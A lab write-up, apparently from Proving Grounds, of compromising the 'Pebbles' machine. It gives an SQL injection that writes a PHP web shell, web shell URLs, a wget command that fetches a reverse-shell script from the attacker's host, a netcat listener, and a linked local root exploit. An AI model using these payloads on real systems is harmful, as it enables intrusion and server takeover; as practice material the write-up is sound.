# 🪨 Pebbles (Linux)

## 🌐 Initial Foothold

📘 Walkthrough Reference:  
- [Notion Writeup by Luis Moret](https://sudsy-fireplace-912.notion.site/Pebbles-from-Proving-Grounds-without-SQLMap-by-Luis-Moret-lainkusanagi-23b29df77e6946a6bb8cb213a76a9ac8)

🔎 SQL Injection → Web Shell

Discovered SQL injection vulnerability. Used the following SQL command to upload a PHP web shell:

```sql
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"
```

Then accessed the webshell at:

```
http://192.168.216.52:3305/webshell.php?cmd=
```

🛠️ Uploaded a custom bash reverse shell script using:

```
http://192.168.216.52:3305/webshell.php?cmd=wget 192.168.45.229/bash.sh -O /tmp/bash.sh
```

Started listener:

```bash
nc -nlvp 80
```

Executed the reverse shell:

```
http://192.168.216.52:3305/webshell.php?cmd=/bin/bash%20/tmp/bash.sh
```

Got a shell back!

---

## 🧑‍💻 Privilege Escalation

Followed the steps in the walkthrough to escalate privileges using the following local root exploit:  
🔗 [exploit-db 1518](https://www.exploit-db.com/exploits/1518)

Compiled and ran it to get a root shell.

---

## 🧠 Key Takeaways

🔍 SQLi can be used to drop web shells directly using `INTO OUTFILE`  
🕳️ Simple web shells are still powerful when combined with `wget` or `curl`  
🚀 Local privilege escalation via kernel exploits requires proper enumeration  
